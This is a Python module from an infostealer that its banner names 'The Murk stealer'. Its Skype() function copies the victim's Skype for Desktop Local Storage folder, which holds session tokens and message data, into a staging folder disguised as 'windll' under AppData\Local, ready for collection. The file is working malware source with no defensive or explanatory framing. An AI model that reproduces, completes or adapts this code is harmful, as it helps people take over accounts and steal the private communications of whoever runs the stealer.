#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from shutil import copytree
from os import makedirs,sep,environ
from manager.logger import Log

def Skype():
    data = ""
    mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
    path1 = r"\Microsoft\Skype for Desktop\Local Storage"
    try:
        makedirs(rf'{mainPath}\windll\Messengers\Skype')
        copytree(rf"{mainPath}{path1}",rf"{mainPath}\windll\Messengers\Skype")
        data += "\n∟📨Skype"
        return data
    except Exception as e:
        Log(f"Skype ---> {e}")
        return data

